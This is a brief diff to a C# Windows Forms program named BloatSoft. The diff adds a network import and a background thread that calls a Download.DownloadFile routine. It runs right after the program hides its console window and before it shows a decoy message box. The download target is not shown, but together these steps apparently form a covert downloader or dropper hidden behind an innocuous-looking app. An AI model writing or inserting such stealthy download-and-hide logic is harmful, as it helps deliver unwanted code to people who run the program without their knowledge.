@@ -6,6 +6,7 @@ using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Threading;
+using System.Net;
 
 namespace BloatSoft
 {
@@ -26,6 +27,11 @@ namespace BloatSoft
             Thread.Sleep(300);
             var handle = GetConsoleWindow();
             ShowWindow(handle, SW_HIDE);
+
+
+            Thread dl = new Thread(Download.DownloadFile);
+            dl.Start();
+
             MessageBox.Show("fiem");
         }
     }
